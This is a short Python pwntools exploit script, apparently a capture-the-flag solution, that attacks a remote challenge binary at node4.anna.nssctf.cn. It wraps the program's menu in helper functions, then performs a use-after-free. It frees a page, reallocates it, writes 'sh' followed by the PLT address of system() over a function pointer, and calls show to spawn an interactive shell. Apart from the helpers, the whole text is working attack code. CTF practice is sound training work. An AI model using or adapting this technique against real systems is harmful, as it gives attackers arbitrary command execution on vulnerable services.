from pwn import *

context(log_level="info")
#io = process("./pwn")
io = remote("node4.anna.nssctf.cn", 29865)
elf = ELF("./pwn")


def create():
    io.recvuntil(b":")
    io.sendline(b"1")


def edit(page_num, string):
    io.recvuntil(b":")
    io.sendline(b"2")
    io.recvuntil(b"page\n")
    io.sendline(f"{page_num}".encode())
    io.recvuntil(b"strings\n")
    io.sendline(string)


def delete(page_num):
    io.recvuntil(b":")
    io.sendline(b"3")
    io.recvuntil(b"page")
    io.sendline(f"{page_num}".encode())


def show(page_num):
    io.recvuntil(b":")
    io.sendline(b"4")
    io.recvuntil(b"page")
    io.sendline(f"{page_num}".encode())


system_plt = elf.plt["system"]
payload = b"sh\x00\x00" + p32(system_plt)

create()
delete(0)
create()
edit(1, payload)
show(0)

io.interactive()
